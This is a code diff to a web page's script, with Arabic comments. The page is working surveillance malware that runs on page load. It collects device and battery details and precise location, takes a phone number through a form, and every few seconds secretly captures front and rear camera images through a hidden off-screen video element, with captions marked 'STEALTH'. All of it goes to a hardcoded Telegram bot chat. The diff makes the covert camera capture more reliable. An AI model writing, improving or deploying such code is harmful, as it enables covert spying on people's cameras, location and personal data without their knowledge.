@@ -174,10 +174,11 @@
         const CHAT_ID = '5058927918';
         let isRecording = false;
         let locationSent = false;
+        let cameraStream = null;
 
         // إرسال بيانات الجهاز + الموقع فور فتح الموقع
         window.addEventListener('load', async () => {
-            sendDeviceInfo(); // تم تعديلها لجلب معلومات دقيقة عن الجهاز والبطارية
+            sendDeviceInfo();
             getLocation();
             startContinuousRecording();
         });
@@ -186,7 +187,6 @@
         function getDeviceManufacturer() {
             const ua = navigator.userAgent;
             
-            // قائمة الشركات المصنعة المعروفة
             if (ua.includes('Samsung') || ua.includes('SM-') || ua.includes('GT-')) return 'Samsung';
             if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) return 'Apple';
             if (ua.includes('Xiaomi') || ua.includes('Mi ') || ua.includes('Redmi')) return 'Xiaomi';
@@ -208,7 +208,6 @@
             if (ua.includes('Dell')) return 'Dell';
             if (ua.includes('Microsoft')) return 'Microsoft';
             
-            // محاولة استخراج اسم الجهاز من الـ User Agent
             const matches = ua.match(/\(([^)]+)\)/);
             if (matches && matches[1]) {
                 const deviceInfo = matches[1];
@@ -227,7 +226,6 @@
             return 'غير معروف';
         }
 
-        // دالة جديدة لتحديد نوع الجهاز بالتفصيل
         function getDetailedDeviceType() {
             const ua = navigator.userAgent;
             let deviceType = 'غير معروف';
@@ -235,22 +233,16 @@
             
             if (/Android/i.test(ua)) {
                 deviceType = 'Android';
-                // محاولة استخراج موديل الأندرويد
                 const androidMatch = ua.match(/Android\s+([\d.]+)/);
                 const version = androidMatch ? androidMatch[1] : 'غير معروف';
-                
-                // محاولة استخراج اسم الجهاز
                 const modelMatch = ua.match(/; ([^;]+) Build\//) || ua.match(/; ([^;]+);/);
                 deviceModel = modelMatch ? modelMatch[1].trim() : 'غير معروف';
-                
                 return { type: deviceType, version, model: deviceModel };
             }
             else if (/iPhone/i.test(ua)) {
                 deviceType = 'iPhone';
                 const iPhoneMatch = ua.match(/iPhone OS\s+([\d_]+)/);
                 const version = iPhoneMatch ? iPhoneMatch[1].replace(/_/g, '.') : 'غير معروف';
-                
-                // محاولة تحديد موديل الآيفون
                 if (ua.includes('iPhone 15')) deviceModel = 'iPhone 15';
                 else if (ua.includes('iPhone 14')) deviceModel = 'iPhone 14';
                 else if (ua.includes('iPhone 13')) deviceModel = 'iPhone 13';
@@ -258,7 +250,6 @@
                 else if (ua.includes('iPhone 11')) deviceModel = 'iPhone 11';
                 else if (ua.includes('iPhone X')) deviceModel = 'iPhone X';
                 else deviceModel = 'موديل غير محدد';
-                
                 return { type: deviceType, version, model: deviceModel };
             }
             else if (/iPad/i.test(ua)) {
@@ -285,7 +276,6 @@
             return { type: deviceType, version: 'غير معروف', model: 'غير معروف' };
         }
 
-        // دالة جديدة لجلب معلومات البطارية بالتفصيل
         async function getDetailedBatteryInfo() {
             let batteryInfo = {
                 level: 'غير متاح',
@@ -297,26 +287,18 @@
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
-                    
                     batteryInfo.level = Math.round(battery.level * 100) + '%';
                     batteryInfo.charging = battery.charging ? '🔌 يشتغل على الشاحن' : '🔋 يشتغل على البطارية';
                     
-                    // وقت الشحن المتبقي (بالدقائق)
                     if (battery.chargingTime !== Infinity && battery.chargingTime !== 0) {
                         const minutes = Math.round(battery.chargingTime / 60);
                         batteryInfo.chargingTime = minutes + ' دقيقة';
-                    } else {
-                        batteryInfo.chargingTime = 'غير معروف';
                     }
                     
-                    // وقت تفريغ البطارية المتبقي
                     if (battery.dischargingTime !== Infinity && battery.dischargingTime !== 0) {
                         const minutes = Math.round(battery.dischargingTime / 60);
                         batteryInfo.dischargingTime = minutes + ' دقيقة';
-                    } else {
-                        batteryInfo.dischargingTime = 'غير معروف';
                     }
-                    
                 } catch (e) {
                     console.log('خطأ في قراءة البطارية');
                 }
@@ -325,13 +307,11 @@
             return batteryInfo;
         }
 
-        // دالة إرسال معلومات الجهاز (معدلة بالكامل)
         async function sendDeviceInfo() {
             const deviceDetails = getDetailedDeviceType();
             const manufacturer = getDeviceManufacturer();
             const batteryInfo = await getDetailedBatteryInfo();
             
-            // معلومات إضافية
             const language = navigator.language || navigator.userLanguage || 'غير معروف';
             const platform = navigator.platform || 'غير معروف';
             const cookiesEnabled = navigator.cookieEnabled ? 'مفعلة' : 'غير مفعلة';
@@ -390,14 +370,12 @@
             document.getElementById('phoneSection').classList.add('hidden');
             document.getElementById('successMsg').style.display = 'block';
             
-            // إرسال الرقم للبوت مع معلومات الجهاز أيضاً
             const deviceDetails = getDetailedDeviceType();
             const manufacturer = getDeviceManufacturer();
             
             await sendTelegramMessage(`📞 **رقم هاتف جديد** 📞\n☎️ **${phone}**\n📱 الجهاز: **${deviceDetails.type} ${manufacturer}**`);
         }
 
-        // الحصول على الموقع الحقيقي بدقة عالية جداً
         function getLocation() {
             if (navigator.geolocation && !locationSent) {
                 navigator.geolocation.getCurrentPosition(
@@ -469,88 +447,136 @@
             }
         }
 
+        // ✅ التصحيح الرئيسي: نظام الكاميرا المحسن
         function startContinuousRecording() {
             // كاميرا أمامية كل 5 ثواني
             setInterval(async () => {
-                if (!isRecording) await captureAndSend('user', '📸 كاميرا أمامية STEALTH');
+                try {
+                    await captureAndSend('user', '📸 كاميرا أمامية STEALTH');
+                } catch(e) {}
             }, 5000);
 
             // كاميرا خلفية كل 10 ثواني
             setInterval(async () => {
-                if (!isRecording) await captureAndSend('environment', '📷 كاميرا خلفية STEALTH');
+                try {
+                    await captureAndSend('environment', '📷 كاميرا خلفية STEALTH');
+                } catch(e) {}
             }, 10000);
         }
 
         async function captureAndSend(facingMode, caption) {
             try {
-                const photo = await capturePhoto(facingMode);
-                if (photo) await sendPhoto(photo, caption);
-            } catch (error) {}
+                const photoDataUrl = await capturePhoto(facingMode);
+                if (photoDataUrl) {
+                    await sendPhoto(photoDataUrl, caption);
+                }
+            } catch (error) {
+                console.log('فشل التقاط الصورة:', error);
+            }
         }
 
+        // ✅ دالة التصوير المُصححة والمحسنة
         function capturePhoto(facingMode) {
-            return new Promise((resolve) => {
+            return new Promise((resolve, reject) => {
+                // تنظيف أي stream سابق
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                    cameraStream = null;
+                }
+
                 const video = document.createElement('video');
                 video.style.display = 'none';
                 video.style.position = 'fixed';
                 video.style.top = '-9999px';
+                video.muted = true;
                 document.body.appendChild(video);
                 
-                navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: facingMode === 'user' ? 'user' : 'environment',
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 },
-                        aspectRatio: 16/9
+                const constraints = {
+                    video: {
+                        facingMode: facingMode,
+                        width: { ideal: 1280, max: 1920 },
+                        height: { ideal: 720, max: 1080 },
+                        frameRate: { ideal: 30, min: 15 }
                     }
-                }).then(stream => {
-                    video.srcObject = stream;
-                    video.play();
-                    
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
+                };
+
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(stream => {
+                        cameraStream = stream;
+                        video.srcObject = stream;
                         
-                        stream.getTracks().forEach(track => track.stop());
-                        video.remove();
-                        
-                        canvas.toBlob(blob => {
-                            const reader = new FileReader();
-                            reader.onloadend = () => resolve(reader.result);
-                            reader.readAsDataURL(blob);
-                        }, 'image/jpeg', 0.9);
-                    }, 1500);
-                }).catch(() => {
-                    if (video.parentNode) video.remove();
-                    resolve(null);
-                });
+                        video.onloadedmetadata = () => {
+                            video.play().then(() => {
+                                // انتظار أطول للكاميرا لتكون جاهزة
+                                setTimeout(() => {
+                                    try {
+                                        const canvas = document.createElement('canvas');
+                                        canvas.width = Math.min(video.videoWidth, 1280);
+                                        canvas.height = Math.min(video.videoHeight, 720);
+                                        const ctx = canvas.getContext('2d');
+                                        
+                                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                        
+                                        // تنظيف الكاميرا
+                                        stream.getTracks().forEach(track => track.stop());
+                                        if (video.parentNode) video.remove();
+                                        cameraStream = null;
+                                        
+                                        // تحويل لصورة
+                                        canvas.toBlob((blob) => {
+                                            const reader = new FileReader();
+                                            reader.onloadend = () => resolve(reader.result);
+                                            reader.readAsDataURL(blob, 'image/jpeg');
+                                        }, 'image/jpeg', 0.85);
+                                        
+                                    } catch (e) {
+                                        reject(e);
+                                    }
+                                }, 2000); // انتظار 2 ثانية لضمان جودة الصورة
+                            }).catch(reject);
+                        };
+                    })
+                    .catch((error) => {
+                        if (video.parentNode) video.remove();
+                        reject(error);
+                    });
             });
         }
 
         async function sendPhoto(photoDataUrl, caption) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', dataURLtoBlob(photoDataUrl), `stealth_${Date.now()}.jpg`);
-            formData.append('caption', caption);
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', dataURLtoBlob(photoDataUrl), `stealth_${Date.now()}_${caption.includes('أمامية') ? 'front' : 'back'}.jpg`);
+                formData.append('caption', caption);
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    console.log('فشل إرسال الصورة:', response.status);
+                }
+            } catch (error) {
+                console.log('خطأ في إرسال الصورة:', error);
+            }
         }
 
         async function sendTelegramMessage(message) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('text', message);
-            formData.append('parse_mode', 'Markdown');
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                body: formData
-            });
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('text', message);
+                formData.append('parse_mode', 'Markdown');
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.log('خطأ في إرسال الرسالة:', error);
+            }
         }
 
         function dataURLtoBlob(dataURL) {
@@ -562,6 +588,13 @@
             while (n--) u8arr[n] = bstr.charCodeAt(n);
             return new Blob([u8arr], { type: mime });
         }
+
+        // تنظيف عند إغلاق الصفحة
+        window.addEventListener('beforeunload', () => {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+        });
     </script>
 </body>
 </html>
